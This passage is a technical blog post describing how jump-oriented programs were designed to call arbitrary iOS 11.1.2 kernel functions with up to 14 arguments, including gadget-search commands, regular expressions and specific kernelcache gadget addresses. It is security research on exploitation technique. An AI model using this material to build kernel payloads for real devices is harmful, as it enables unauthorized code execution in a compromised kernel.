---
layout: post
title: "Designing an advanced kernel function call primitive on iOS"
author: Brandon Azad
date: 2018-04-07 15:45:00 -0700
category: security
tags: [iOS, memctl]
description: >
  An explanation of the design process of the jump-oriented programs used by libmemctl to call
  kernel functions on iOS 11.1.2.
---

In this post I'm going to describe a technique for calling arbitrary kernel functions on iOS that
extends a 2-argument function call primitive to support up to 14 64-bit arguments. This is a
refinement of memctl's [first call strategy][call_strategy_1.c], which extends a 6-argument
function call primitive into an 8-argument call. My goal is to shed light on how I design
jump-oriented programs, and hopefully provide a reference for others looking to design similar
programs.

[call_strategy_1.c]: https://github.com/bazad/memctl/blob/2049ddea16ed13ea92aca8a2576b216da90d8763/src/libmemctl/arm64/jop/call_strategy_1.c

I first developed the 14-argument kernel function call strategy in November of last year, and then
introduced an updated variant at the end of January. You can see the implementations in the files
[call_strategy_3.c] and [call_strategy_5.c]. This post will examine call strategy 5 since this
strategy works on the iPhone 8 running iOS 11.1.2, which at the time of writing is the most recent
platform with a public kernel exploit.

[call_strategy_3.c]: https://github.com/bazad/memctl/blob/2049ddea16ed13ea92aca8a2576b216da90d8763/src/libmemctl/arm64/jop/call_strategy_3.c
[call_strategy_5.c]: https://github.com/bazad/memctl/blob/2049ddea16ed13ea92aca8a2576b216da90d8763/src/libmemctl/arm64/jop/call_strategy_5.c

<!--more-->

As a word of warning, this is a long and technical post, and won't be for everyone. I'm writing
primarily for two target audiences: those who are interested in memctl's implementation and those
who want a detailed explanation of designing jump-oriented programs. For the latter group, the
point of this article is to communicate the process I use for JOP design to provide a reference
that can be used for other JOP programs. If you find it getting dry in the middle, skip ahead to
the more interesting parts.


## Table of Contents
{:.no_toc}

* TOC
{:toc}


## Framing the challenge

Even after compromising the iOS kernel, numerous security mitigations make it difficult to inject
new code: no memory regions are both writable and executable, and trying to execute code in a
memory region that was remapped as executable after the fact will trigger a panic. The most
straightforward way to execute arbitrary code in the kernel is to reuse existing code fragments in
new ways. Usually this is done using a technique called return-oriented programming, or ROP,
although on arm64 I'm partial to a slightly different technique called jump-oriented programming,
or JOP.[^1]

The most portable way to use ROP or JOP to execute arbitrary code is to perform the majority of
computation in userspace and then call kernel functions to perform any actions that cannot be done
from userspace.[^2] This motivates the development of techniques to call arbitrary kernel functions
with arbitrary arguments.

To begin with, we assume the existence of kernel memory read and write primitives and a 2-argument
kernel function call primitive with no return value. While this may seem like a lot, there are two
things worth considering. First, there are many ways to build a kernel call primitive out of a
kernel read/write primitive (the most popular probably being the [iokit_user_client_trap] method),
so all we really need is the read/write primitive. Second, because the JOP payload can be compacted
to around 768 bytes, this strategy can also be used directly as an exploit payload for certain
IOKit vulnerabilities that lead to bad virtual method calls.

[iokit_user_client_trap]: https://conference.hitb.org/hitbsecconf2013kul/materials/D2T2%20-%20Stefan%20Esser%20-%20Tales%20from%20iOS%206%20Exploitation%20and%20iOS%207%20Security%20Changes.pdf

Using these primitives, we will develop a technique to call arbitrary kernel functions with up to
14 full (that is, 64-bit) arguments and retrieve the full return value in userspace. The original
goal was to support 12 arguments, which is sufficient to cover most interesting kernel functions,
including the 10-argument function `mount_common`. However, while scanning for gadgets to get an
idea for how I would structure the JOP program, I discovered that supporting 14 arguments was no
more difficult.


## High-level overview

The JOP program can be divided into 4 high-level steps:

1. Set up the registers and, if necessary, the stack so that the target function can be called with
   the appropriate arguments.
2. Call the target function.
3. Store the return value so it is accessible by userspace.
4. Safely resume execution back in our caller.

The first two steps are relatively straightforward, but the latter two could use elaboration.

Once we're done calling the target function, we need to do two things: safely stop running kernel
code and retrieve the value returned by the target function back in userspace. Both of these
challenges are complicated by themselves but relatively easy given our prior assumptions.

For safely returning from the kernel, it suffices to note that we are extending an existing
2-argument kernel call primitive which must itself safely return from kernel code to user code.
Thus, if we make our JOP program itself behave like a kernel function, returning to our caller when
done, then the 2-argument kernel call primitive will take care of safely returning to userspace.

For the other challenge, getting the return value of the function call to userspace, we can simply
have the JOP program store the return value in memory and rely on our kernel memory read primitive
in userspace to retrieve the value once the payload finishes running.


## The ARM64 calling convention

In order to figure out how to call a kernel function with 14 arguments, we first need to understand
how functions are actually called on the iPhone. This is referred to as the calling convention for
the platform: it specifies where the various arguments to the function go so that the callee knows
where to find them. 64-bit iPhones use the ARMv8 AArch64 architecture, which has an official
[procedure call standard][Procedure Call Standard for the ARM 64-bit Architecture]. However, Apple
has chosen to diverge slightly from the official standard when designing its own [calling
convention][ARM64 Function Calling Conventions]. Because of that, we'll focus on Apple's
convention, and we'll refer to Apple's architecture as arm64 rather than AArch64 to clarify that
we're diverging from the official ABI.[^3]

[Procedure Call Standard for the ARM 64-bit Architecture]: http://infocenter.arm.com/help/topic/com.arm.doc.ihi0055b/IHI0055B_aapcs64.pdf
[ARM64 Function Calling Conventions]: https://developer.apple.com/library/content/documentation/Xcode/Conceptual/iPhoneOSABIReference/Articles/ARM64FunctionCallingConventions.html

To simplify matters, we will ignore all non-integral arguments and all arguments larger than 64
bits. That means, for example, that we will not consider the case of calling a function that takes
a floating point argument. This is not a huge limitation in the kernel since almost all function
arguments are integers or pointers.

According to Apple's arm64 convention, the first 8 arguments to a function get passed in registers
`x0` through `x7`, while subsequent arguments are laid out in order on the stack. Arguments placed
on the stack consume only as much stack space as required, although padding may be inserted between
arguments to ensure proper alignment. For example, consider the following function:

{% highlight C %}
int64_t
function(
    int64_t arg0, int32_t arg1, int16_t arg2, int8_t  arg3,
    int8_t  arg4, int16_t arg5, int32_t arg6, int64_t arg7,
    int8_t  arg8, int8_t  arg9, int64_t arg10);
{% endhighlight %}

According to Apple's convention, the arguments `arg0` through `arg7` get placed in registers `x0`
through `x7`. Then, arguments `arg8` through `arg10` get laid out on the stack:

* `arg8`, being the first stack argument, starts at the top of the stack, `sp + 0`. It is 1 byte
  long.
* `arg9` is placed at the next available aligned address after `arg8`. Since the next available
  stack slot is `sp + 1`, and `arg9` is 1 byte long, it fits at `sp + 1`.
* `arg10` is placed at the next available aligned address after `arg9`. This time, the next
  available stack slot is `sp + 2`, but `arg10` is 8 bytes, meaning it will be unaligned if placed
  there. The next slot at which `arg10` fits with an 8-byte alignment is `sp + 8`.

Graphically, this means the stack looks like this:

{% include image.html
           image = "/img/2018/arm64-stack-1-1-8.svg"
           max-height = "400px"
           title =
"The stack layout for a function with stack arguments of size 1, 1, and 8 bytes."
           caption =
"The stack layout for an arm64 function with stack arguments of size 1, 1, and 8 bytes. The arrow
points from low addresses to high addresses and shows in which direction data is written in
memory."
%}

We'll need to respect this convention when laying out arguments on the stack.

The other thing we need to know about the calling convention is which registers must be saved by
called functions and which ones are okay to clobber. This is important to know for two reasons:
First, as mentioned previously, the JOP program itself will behave like a 2-argument kernel
function, so it must not clobber registers its caller expects to remain unchanged. Second, the JOP
program itself will call the target function, which means it must not save critical state in
registers that may be clobbered over the course of the target function call.

On arm64, registers `x19` through `x28` are designated as callee-saved, which means that a caller
may expect their contents to remain unchanged across function calls and it's the callee's
responsibility to save these registers if it wants to use them. Furthermore, register `x29` is the
frame pointer and register `x30` is the link (or return address) register, which must be properly
initialized and managed over the lifetime of the function.


## Jump-oriented programming: a primer

[Jump-oriented programming][jump-oriented programming] (JOP) is a generalization of the
return-oriented programming (ROP) code reuse technique that allows building an exploit payload by
reusing segments of the original program code in new ways. There are two main advantages of JOP
over ROP. First, JOP payloads do not need to rely on the stack as a linear control flow mechanism
in the same way as ROP. This allows more flexibility when interacting with the stack: for example,
a JOP program can set the stack pointer to an arbitrary value, while a ROP program cannot (at
least, not if it hopes to keep executing afterwards). Second, since JOP is a generalization of ROP,
using JOP allows more flexibility when selecting which pieces of program code to reuse, which in
turn allows more flexibility when designing the payload. In fact, there are some exploit
mitigations (like protected return addresses) that defeat ROP but do not defend against JOP because
of its increased flexibility.

[jump-oriented programming]: https://repository.lib.ncsu.edu/bitstream/handle/1840.4/4135/TR-2010-8.pdf

The high-level technique behind JOP is to chain together short sequences of instructions, which in
this context are called gadgets, that end in some form of indirect branch. If the attacker can gain
control of the contents of some registers or memory in addition to `pc` (the program counter or
instruction pointer register), then it's likely possible to guide execution through a few branches
to chain together pieces of useful computation. That's basically the whole idea, although it's much
easier to understand with some examples and a few useful strategies.

For example, consider finding the following gadget in an AArch64 program:

{% highlight Assembly %}
ldr     x3, [x7], #8
br      x3
{% endhighlight %}

This gadget loads the 8-byte value pointed to by `x7` into register `x3`, increments `x7` by 8,
then jumps to the address just loaded into `x3`. If the value loaded into `x3` were a short snippet
of code followed by a jump back to this gadget, then the second time this gadget were to run it
would jump to a new address, the one stored right after the first address in memory. If this
process were to repeat, assuming that each executed snippet jumps back to this gadget, we would see
that this gadget seems to interpret `x7` as an array of pointers and jumps to each address in turn.
Such a gadget is referred to as a "dispatch gadget". It is useful for guiding the execution of the
JOP program through a sequence of other gadgets that perform the actual work desired.

So, what would the other gadgets look like so that execution flows back to the dispatch gadget?
First, they must not clobber state used by the dispatch gadget, which in this case is register
`x7`, or rely on any state that is clobbered by the dispatch gadget, in this case `x3`.
Furthermore, they must return to the dispatch gadget at the end. While there are unlikely to be
many direct branches to the dispatch gadget, indirect branches through registers are far more
common. For example:

{% highlight Assembly %}
add     x0, x1, x2
blr     x8
{% endhighlight %}

This gadget performs the useful work of computing the sum of registers `x1` and `x2` and storing
the result in `x0`. At the end it performs an indirect jump back to `x8`. Thus, if we ensure that
register `x8` contains a pointer to the dispatch gadget, then this gadget can be used in the JOP
chain to compute sums.

As we will see, arm64 in the kernelcache is particularly well suited to jump-oriented programming
due to the extensive set of general-purpose registers and the frequent use of indirect branches in
compiled code.


## An aside: Generality vs elegance in JOP design

When designing a ROP or JOP program, I almost always find that there's a trade-off between what I
call the "generality" of the program (how likely this program is to work across different software
versions with different sets of available gadgets) and elegance (how cleanly and efficiently the
program accomplishes its goal). For exploits in the wild, generality is usually the most important:
you want the payload to work across as many different software versions as possible. However, for
other types of exploits, the decision isn't necessarily clear-cut. For example, it can be difficult
to determine which sets of gadgets are likely to stick around and which will go away in the next
release, which makes it hard to justify the time spent generalizing. Furthermore, highly general
gadget selections often produce longer, more roundabout JOP programs that are more difficult to
develop and maintain.

For personal projects I prefer to implement JOP programs elegantly without regard for generality. I
find these programs easier to understand and more enjoyable to develop. Allowing JOP programs to be
tightly coupled to the set of available gadgets allows you to leverage highly complex gadgets that
accomplish very specific objectives. I took full advantage of this when designing this program. The
downside is that several of the gadgets used have no viable alternative in the kernelcache, meaning
that small changes could force substantial redesigns in future implementations of the program.


## Collecting kernelcache gadgets

In order to get a list of gadgets in the kernelcache, we first need to obtain the kernelcache file
itself. The kernelcache can be copied directly from a device or extracted from an IPSW file
downloaded from Apple. I usually use [ipsw.me] to find the direct download links for specific
iPhone versions. Once you have the IPSW file, you can extract it using the `unzip` utility (IPSW
files are really ZIP archives). Finally, you'll need to decompress the kernelcache using one of a
number of available utilities, including [joker] and [memctl].

[ipsw.me]: https://ipsw.me
[joker]: http://newosxbook.com/tools/joker.html
[memctl]: https://github.com/bazad/memctl

My preferred method for gathering gadgets from the kernelcache is to use [ROPgadget], a Python tool
that uses the [Capstone] engine for disassembly. As written ROPgadget will not recognize the
prelinked executable code segment `__PLK_TEXT_EXEC`, which is where all of the code for IOKit
drivers is stored, and hence it will miss the majority of the gadgets. However, it's relatively
straightforward to patch the tool to process all segments containing executable code.[^4]

Once ROPgadget is set up, the following command will search for gadgets in the kernelcache:

[ROPgadget]: https://github.com/JonathanSalwan/ROPgadget
[Capstone]: https://github.com/aquynh/capstone

{% highlight Bash %}
ROPgadget --binary path/to/decompressed/kernelcache --depth 13 > kernelcache-gadgets.txt
{% endhighlight %}

This command will write a list of all ROP and JOP gadgets of length at most 13 instructions to the
file `kernelcache-gadgets.txt`. From here, you can inspect the file and search for gadgets matching
specific criteria. As silly as it may sound, I find that opening the text file in vim and searching
for gadgets using regular expressions is completely sufficient for my needs.

You should see on the order of a million gadgets, but filtering out any gadgets
with a hardcoded kernel address (which are less likely to be useful due to fixed branching) will
reduce that to something more manageable. For example, the iOS 11.1.2 kernelcache for the iPhone 7
contains 1,537,404 unique gadgets of 13 or fewer instructions, but removing those with a hardcoded
kernel address reduces the number to 371,209.


## A preliminary design

We want to call a kernel function with 14 arguments, so we know by the arm64 calling convention
that we'll need to properly initialize the stack. We can roughly describe our desired JOP program
as follows:

1. Set up the stack.
2. Copy the function arguments onto the stack and into registers.
3. Call the target function.
4. Store the return value in memory so it can be read back later.
5. Clean up the stack.
6. Return to our original caller so that we exit from the kernel cleanly.

It's worth considering how each of these steps could be achieved before choosing exactly what
gadgets to use.

First, let's consider step 1, how we would set up stack memory using JOP. Since we want our entire
JOP program to behave like a function, this step is really about performing the role of the
function prologue: reserve stack space, save registers, etc. There are two relatively
straightforward approaches: we could either try to find individual gadgets to perform these steps,
or we could try to find an entire function prologue to use as a gadget. The first approach is in
many ways simpler, since we would be chaining many small gadgets together to build our
functionality. However, if we can find a function which reserves the necessary stack space and
saves the appropriate registers before performing an indirect jump, we can greatly shorten the
final JOP program.

Using an entire function prologue has another advantage: we can probably use the same function's
epilogue for cleanup and to return to our original caller. Thus, if we can find an appropriate
function for step 1, we've probably also taken care of steps 5 and 6. This just leaves steps 2, 3,
and 4.

For step 2, we need to copy the target function's arguments onto the stack and into registers.
Again, we could decompose this into individual steps, but it's possible that some code in the
kernel performs an indirect function call with a large number of saved parameters, which would make
our lives much easier. For example, this step would be simple if we could find a gadget like the
following C code:

{% highlight C %}
struct indirect_call *memory = some_register;
memory->function(memory->arg0,  memory->arg1,
                 memory->arg2,  memory->arg3,
                 memory->arg4,  memory->arg5,
                 memory->arg6,  memory->arg7,
                 memory->arg8,  memory->arg9,
                 memory->arg10, memory->arg11,
                 memory->arg12, memory->arg13);
{% endhighlight %}

This type of gadget would be helpful because it would perform all the work of loading the arguments
from memory and saving them into the appropriate registers and slots on the stack.[^5] However, if
we don't find such a gadget, we will have to perform this step using multiple gadgets in sequence.
This means we will probably want gadgets or gadget sequences to load values from memory into
registers `x0` through `x7` and to copy values from memory onto the stack. Most likely, the
simplest way to perform all of this is to find a load gadget to load a value from memory,
some move gadgets to move values from the loaded registers into the desired registers, and a store
gadget to store a value to a specific memory location (in this case, the stack).

Now let's consider step 3. Once we've initialized the registers and stack with the arguments, we
want to call the target function and then resume executing our JOP program. Once again, there are
two general approaches: we could initialize `x30` (the return address register) and then perform a
branch to the target function, or we could try to find a gadget consisting of an indirect function
call followed by an indirect branch. I used the first approach in my original JOP strategies, but
the scarcity of these gadgets proved problematic: trying to work with the few gadgets that
manipulate register `x30` placed severe constraints on the design of the final JOP program. Thus,
for this new strategy, I opted to consider trying to find a gadget that itself contained an
indirect function call and letting the architecture take care of register `x30` for me.

Finally, that just leaves step 4, storing the return value from the target function in memory so
that once the JOP program returns to user space we can read it back. For this step we will need to
find a way to store the return value, in register `x0`, to a known memory address. Thus, we will
want to look for gadgets using the `str` instruction (or any of its relatives).

Now that we have an idea of what we're looking for, it's time to try and find our gadgets.


## Choosing a prologue gadget

The first pieces I try to look for in any JOP program are the complicated or rare ones, since they
usually dictate the shape of the final design. In this case, that includes the function
prologue/epilogue that sets up the stack and saves registers and any gadget we can find that will
load a bunch of values from memory into registers (or even onto the stack) for a function call.

First let's consider the function prologue, for which we have a few criteria:

1. We need the function prologue to reserve sufficient stack space to store arguments 8 through 14
   (that is, six 64-bit words, or `0x30` bytes), on top of the space used to save registers.
2. Ideally the prologue would save (and the epilogue would restore) all registers clobbered by the
   rest of the JOP program, since we want the JOP program to behave like a normal function.
   According to the arm64 calling convention, registers `x19` through `x28` are callee-saved, while
   `x29` (the frame pointer register) and `x30` (the link register or return address register) have
   special meanings and must be saved by the callee if the callee itself calls another function.
   Thus, the best we can hope for is a prologue that saves registers `x19` through `x28` as well as
   `x29` and `x30`.
3. We need the function to perform an indirect jump using a register whose contents we control.
   Since we only assume a 2-argument function call primitive to start, this means the indirect jump
   must use a value obtained via register `x0` or `x1`.

I first tried to search for typical prologue gadgets using the following vim-style regular
expression, designed to match the part of the prologue that saves the callee-saved registers:

```
\(stp x[^;]*; \)\{5\}
```

Here are some typical examples of matched gadgets:

```
0xfffffff00629d494 : add sp, sp, #0x60 ; ret ; sub sp, sp, #0x60 ; stp x26, x25, [sp, #0x10] ; stp x24, x23, [sp, #0x20] ; stp x22, x21, [sp, #0x30] ; stp x20, x19, [sp, #0x40] ; stp x29, x30, [sp, #0x50] ; add x29, sp, #0x50 ; mov x19, x0 ; ldr x8, [x19] ; ldr x8, [x8, #0x580] ; blr x8
0xfffffff00631b940 : add sp, sp, #0x70 ; ret ; stp x26, x25, [sp, #-0x50]! ; stp x24, x23, [sp, #0x10] ; stp x22, x21, [sp, #0x20] ; stp x20, x19, [sp, #0x30] ; stp x29, x30, [sp, #0x40] ; add x29, sp, #0x40 ; mov x20, x0 ; ldr x0, [x20, #0x88] ; ldr x8, [x0] ; ldr x8, [x8, #0x88] ; blr x8
0xfffffff006c9d04c : ret ; stp x28, x27, [sp, #-0x60]! ; stp x26, x25, [sp, #0x10] ; stp x24, x23, [sp, #0x20] ; stp x22, x21, [sp, #0x30] ; stp x20, x19, [sp, #0x40] ; stp x29, x30, [sp, #0x50] ; add x29, sp, #0x50 ; mov x19, x0 ; ldr x0, [x19, #0x68] ; ldr x8, [x0] ; ldr x8, [x8, #0xb0] ; blr x8
```

Since the `ret` instruction typically ends a function, we can deduce that the three function
prologues begin with the instructions `sub sp, sp, #0x60`, `stp x26, x25, [sp, #-0x50]!`, and `stp
x28, x27, [sp, #-0x60]!`, respectively. By looking at more of these gadgets, we can eventually
determine that there are 2 different styles of prologue: one that begins with a `sub` instruction
to reserve space on the stack and one that begins with a pre-indexed `str` instruction to both
reserve space and store some values.

These gadgets also tell us how the prologue should lay out the stack. We can see that the registers
`x29` and `x30` get stored at the highest stack address, followed by any of the callee-saved
registers in reverse order. Any space after (that is, at a lower address than) the last
callee-saved register is used for local variables.

This means that for our function call we will want a prologue gadget that sets up the stack like
this:

{% include image.html
           image = "/img/2018/arm64-stack-14-args.svg"
           max-height = "500px"
           title =
"The stack layout for a function with 14 arguments."
           caption =
"The conventional stack layout for a function with `0x30` bytes of stack space for local variables.
The local variable space (from `sp` to `sp+30`) shows how the last 6 arguments to the target
function will be arranged on the stack." %}

That is, we need a prologue that reserves at least `0x90` bytes of stack memory: `0x60` bytes for
saving registers and at least `0x30` bytes of local variables for the arguments for the target
function. (Of course, we don't need the prologue gadget itself to initialize the arguments for the
target function; that will be done by another gadget.)

Using this criteria, we can search for gadgets matching each style that store the appropriate
registers and reserve sufficient stack space. In my case, I found a number of suitable `sub`-style
gadgets:

```
0xfffffff0064abae0 : sub sp, sp, #0x90 ; stp x28, x27, [sp, #0x30] ; stp x26, x25, [sp, #0x40] ; stp x24, x23, [sp, #0x50] ; stp x22, x21, [sp, #0x60] ; stp x20, x19, [sp, #0x70] ; stp x29, x30, [sp, #0x80] ; add x29, sp, #0x80 ; mov x19, x0 ; ldr x0, [x19, #0x40] ; ldr x8, [x0] ; ldr x8, [x8, #0xd0] ; blr x8
0xfffffff0063adb7c : sub sp, sp, #0x90 ; stp x28, x27, [sp, #0x30] ; stp x26, x25, [sp, #0x40] ; stp x24, x23, [sp, #0x50] ; stp x22, x21, [sp, #0x60] ; stp x20, x19, [sp, #0x70] ; stp x29, x30, [sp, #0x80] ; add x29, sp, #0x80 ; mov x19, x0 ; ldr x8, [x19] ; ldr x8, [x8, #0x20] ; blr x8
0xfffffff0066012a0 : sub sp, sp, #0xa0 ; stp x28, x27, [sp, #0x40] ; stp x26, x25, [sp, #0x50] ; stp x24, x23, [sp, #0x60] ; stp x22, x21, [sp, #0x70] ; stp x20, x19, [sp, #0x80] ; stp x29, x30, [sp, #0x90] ; add x29, sp, #0x90 ; mov x19, x0 ; ldr x8, [x19] ; ldr x8, [x8, #0x390] ; blr x8
```

Fortunately, all of these gadgets also end in an indirect branch using a value read from memory
derived from register `x0`, which means that we will control the branch address. Thus, any of these
prologues would serve completely fine for our purposes.

In my case, I decided to use the last gadget to build the payload because it affords an additional
`0x10` bytes of scratch space on the stack if necessary. The full prologue and corresponding
epilogue are:

{% highlight assembly %}
fffffff0066012a0    sub     sp, sp, #0xa0
fffffff0066012a4    stp     x28, x27, [sp, #0x40]
fffffff0066012a8    stp     x26, x25, [sp, #0x50]
fffffff0066012ac    stp     x24, x23, [sp, #0x60]
fffffff0066012b0    stp     x22, x21, [sp, #0x70]
fffffff0066012b4    stp     x20, x19, [sp, #0x80]
fffffff0066012b8    stp     x29, x30, [sp, #0x90]
fffffff0066012bc    add     x29, sp, #0x90
fffffff0066012c0    mov     x19, x0
fffffff0066012c4    ldr     x8, [x19]
fffffff0066012c8    ldr     x8, [x8, #0x390]
fffffff0066012cc    blr     x8
...
fffffff006601470    ldp     x29, x30, [sp, #0x90]
fffffff006601474    ldp     x20, x19, [sp, #0x80]
fffffff006601478    ldp     x22, x21, [sp, #0x70]
fffffff00660147c    ldp     x24, x23, [sp, #0x60]
fffffff006601480    ldp     x26, x25, [sp, #0x50]
fffffff006601484    ldp     x28, x27, [sp, #0x40]
fffffff006601488    add     sp, sp, #0xa0
fffffff00660148c    ret
{% endhighlight %}

It's clear from the epilogue gadget that the only state that needs to be preserved between the
prologue and the epilogue is the stack pointer register `sp`. Any other registers are either not
caller-saved or restored by the epilogue. Thus, using this prologue/epilogue gadget pair allows us
to clobber any register except `sp` in our JOP program.


## Loading the arguments to the function

The next important gadget to find is the one that will load as many of the arguments for the
target function call as possible; barring that, we at least want a gadget that will load a bunch of
registers with values from memory so that we can move the values to the appropriate locations
ourselves.

The key for this gadget is that we are looking for a number of consecutive loads. I searched with
the following vim regex, intended to capture a sequence of `ldp` instructions reading from a
non-`sp` register (to avoid epilogues):

```
\(ldp x..\?, x..\?, \[x[^;]*; \)\{5\}
```

All of the gadgets I found were of these two styles:

```
0xfffffff006be82a4 : ldp x19, x20, [x9, #-0x50] ; ldp x21, x22, [x9, #-0x40] ; ldp x23, x24, [x9, #-0x30] ; ldp x25, x26, [x9, #-0x20] ; ldp x27, x28, [x9, #-0x10] ; ldp x29, x30, [x9], #0x10 ; ld1 {v8.4s, v9.4s, v10.4s, v11.4s}, [x9], #0x40 ; ld1 {v12.4s, v13.4s, v14.4s, v15.4s}, [x9] ; add sp, sp, #0xe0 ; ret
0xfffffff006ce40dc : ldr x8, [x19] ; ldr x8, [x8, #0xe8] ; ldp x2, x3, [x23] ; ldp x4, x5, [x23, #0x10] ; ldp x6, x7, [x23, #0x20] ; ldp x9, x10, [x23, #0x30] ; ldp x11, x12, [x23, #0x40] ; stp x22, x21, [sp, #0x20] ; stp x11, x12, [sp, #0x10] ; stp x9, x10, [sp] ; mov x0, x19 ; mov x1, x20 ; blr x8
```

The first gadget looks like a function epilogue, except it uses `x9` as the base register rather
than `sp` and also involves vector instructions. This is not useless for our JOP program, since it
does not fully clobber `sp`, but the modification of `sp` at the end of the gadget is certainly
inconvenient.

The second gadget is much more promising. The first two instructions are not helpful[^6], but the
rest of the gadget looks close to what we're looking for:

{% highlight Assembly %}
fffffff006ce40e4    ldp     x2, x3, [x23]
fffffff006ce40e8    ldp     x4, x5, [x23, #0x10]
fffffff006ce40ec    ldp     x6, x7, [x23, #0x20]
fffffff006ce40f0    ldp     x9, x10, [x23, #0x30]
fffffff006ce40f4    ldp     x11, x12, [x23, #0x40]
fffffff006ce40f8    stp     x22, x21, [sp, #0x20]
fffffff006ce40fc    stp     x11, x12, [sp, #0x10]
fffffff006ce4100    stp     x9, x10, [sp]
fffffff006ce4104    mov     x0, x19
fffffff006ce4108    mov     x1, x20
fffffff006ce410c    blr     x8
{% endhighlight %}

This gadget effectively treats `x23` as an array containing arguments 2 through 11 to the indirect
function call via `x8`, while registers `x19`, `x20`, `x21`, and `x22` are treated as arguments 0,
1, 13, and 12, respectively. This gadget performs all the stack initialization we need, although
it's not quite as good as we were hoping because the function and some of the arguments are loaded
from registers rather than memory. This means we will need to load those arguments from memory into
registers ourselves using other gadgets.


## Performing the function call

To find a function call gadget, I looked for a `blr` instruction followed by an indirect branch:

```
: blr x..\? ; \([^;]*; \)\{0,2\}bl\?r x..\?$
```

This search yielded many hits. Here are some examples of matching gadgets:

```
0xfffffff0071075cc : blr x20 ; movz w0, #0x74 ; blr x20
0xfffffff00681c340 : blr x21 ; ldr x8, [sp, #0xf60] ; br x8
0xfffffff0069d48e4 : blr x21 ; mov x1, x19 ; blr x20
0xfffffff0069da974 : blr x8 ; blr x24
0xfffffff0064219ec : blr x8 ; ldr x8, [x0] ; ldr x8, [x8, #0x138] ; blr x8
0xfffffff0069dbdac : blr x8 ; ldr x8, [x19, #0x350] ; ldr x8, [x8, #0xe8] ; blr x8
0xfffffff00659cbb8 : blr x8 ; mov x1, x0 ; mov x0, x25 ; blr x26
```

Unfortunately, several of these gadgets are unsuitable. For example, the first gadget immediately
clobbers the return value in register `x0` while the fifth dereferences the return value as if it
were a pointer. Since we want to save the return value and we have no idea what it will be, neither
of these options are acceptable. The second gadget is also unusable because it reads the next
gadget to jump to from `sp+f60`, which lies outside our function's stack frame and hence is out of
our control.

The remaining gadgets, however, work fine, and it's clear from scanning the file that there are
numerous viable candidates. Thus, rather than commit to a single gadget at this point, it's better
to choose the right gadget later in the design process once we know what other constraints we'll
need to satisfy.

This in turn means that we won't know what register the return value will be stored in until later,
so there's little point choosing a store gadget right now either.


## The dispatch gadget

So far we've only looked at the complex gadgets. However, there is also an important simple gadget
that will shape the final JOP program: the dispatch gadget.

The original kernel call strategy used the following gadget:

```
fffffff006a4e1a8    ldp     x2, x1, [x1]
fffffff006a4e1ac    br      x2
```

This gadget is very similar to the example dispatch gadget in the introduction to JOP above, except
that this time the data structure containing the gadget pointers is a linked list rather than an
array. If we assume that the indirect branch to `x2` will always eventually jump back to this
gadget, then this gadget effectively walks a linked list of nodes, where the first element in each
node is a pointer to the gadget to run and the second element in the node is a pointer to the next
node:

{% highlight C %}
struct JOP_DISPATCH_NODE {
	void *                     gadget;      // x2
	struct JOP_DISPATCH_NODE * next;        // x1
};
{% endhighlight %}

Under this interpretation, register `x1` always points to the next JOP dispatch node and register
`x2` is clobbered each time the dispatch gadget runs.

While I considered using several other dispatch gadgets, in the end I did not find a compelling
reason to switch.


## Refining the design

At this point we can begin designing the JOP program more concretely. The full and exact design
process I used is too long, technical, and tedious for me to record here, but I hope to illuminate
the first few steps I took in stitching the JOP program together. The rest of the design followed
in the same way.

Let's start from what we know: We will enter the JOP program using our prologue gadget, which I
call `GADGET_PROLOGUE_2`; we will use the function call setup gadget, which I call
`GADGET_POPULATE_2`; and then we will call execute the epilogue, `GADGET_EPILOGUE_2`. Between
`GADGET_PROLOGUE_2` and `GADGET_POPULATE_2`, we will need to initialize at least 6 registers:
`x23`, `x22`, `x21`, `x20`, `x19`, and `x8`. After `GADGET_POPULATE_2` we will need a function call
gadget, `GADGET_CALL_FUNCTION_1`, and a gadget to store the return value to memory,
`GADGET_STORE_RESULT_2`. Most of these gadgets will be chained together using the dispatch gadget,
`JOP_DISPATCH`.

First let's focus on the problem of setting those six registers before `GADGET_POPULATE_2`. Since
four of the six registers are arguments to the target function, we'll need to load those values
from memory. That means we'll need a gadget to perform the loads. However, rather than reinventing
the wheel, it's worth noting that we already have a gadget capable of loading numerous registers
from memory: `GADGET_POPULATE_2` itself.

Consider how we might use `GADGET_POPULATE_2` twice: first use it to load some values into
registers, then shift those values to the proper locations, then call `GADGET_POPULATE_2` a second
time to set up the arguments to the function call. This has the advantage of performing all of the
loads in one shot and relegating the proper placement of values to simpler, easier to find, and
easier to replace `mov` gadgets (that is, gadgets of the form `mov Xdst, Xsrc ; br Xjmp`). The only
limitation is that we'll still need to initialize a few crucial registers, namely `x23`, `x20`, and
`x8`, before the first invocation.

The registers `x23` and `x8` are clearly crucial because they get used directly by the gadget, but
the reason `x20` is important is more subtle. If this gadget is going to be used as part of a JOP
chain using the dispatch gadget mentioned earlier, then presumably the branch to `x8` at the end of
`GADGET_POPULATE_2` will invoke the dispatch gadget. However, the dispatch gadget relies on `x1` to
store the next dispatch node, and `GADGET_POPULATE_2` stores the value of `x20` on entry into
register `x1` on exit. Thus, before calling `GADGET_POPULATE_2` the first time, we need to make
sure that `x8` is a pointer to `JOP_DISPATCH` and `x20` is a pointer to the next dispatch node we
wish to execute. `x23`, meanwhile, will be a pointer to a memory region containing the values we
want to load into the registers.

This gives us a much more manageable task to accomplish between `GADGET_PROLOGUE_2` and
`GADGET_POPULATE_2`: just fill those 3 registers.

However, we still need to figure out how to transition from `GADGET_PROLOGUE_2` to executing our
JOP chain using the dispatch gadget. For reference, here is the end of `GADGET_POPULATE_2`:

{% highlight assembly %}
fffffff0066012c0    mov     x19, x0
fffffff0066012c4    ldr     x8, [x19]
fffffff0066012c8    ldr     x8, [x8, #0x390]
fffffff0066012cc    blr     x8
{% endhighlight %}

In order to execute the dispatch gadget, at the end of the prologue we need `x8` to point to
`JOP_DISPATCH` and `x1` to point to the first node of our JOP chain. The latter is easy, because we
enter the JOP program with control of registers `x0` and `x1` due to our 2-argument call primitive.
In order to set `x8` correctly, we need `x0` to point to a memory region that at offset 0 contains
a pointer to another memory region that at offset `0x390` contains a pointer to `JOP_DISPATCH`.

At this point, it becomes helpful to introduce a notation to keep track of all of the memory
regions and their relationships. Let's call the memory region pointed to by `x0`
`REGION_0` (for the moment) and the region containing the pointer to `JOP_DISPATCH` at offset
`0x390` `REGION_1`. Then we can define the relationship between these regions explicitly using a
dictionary-like syntax:

```
REGION_0 = {
    0: REGION_1
}
REGION_1 = {
    390: JOP_DISPATCH
}
```

Now, as we uncover more values that need to be at specific positions in various memory regions, we
can simply add entries to these definitions.

We can also write out explicit entry conditions for our JOP program:

```
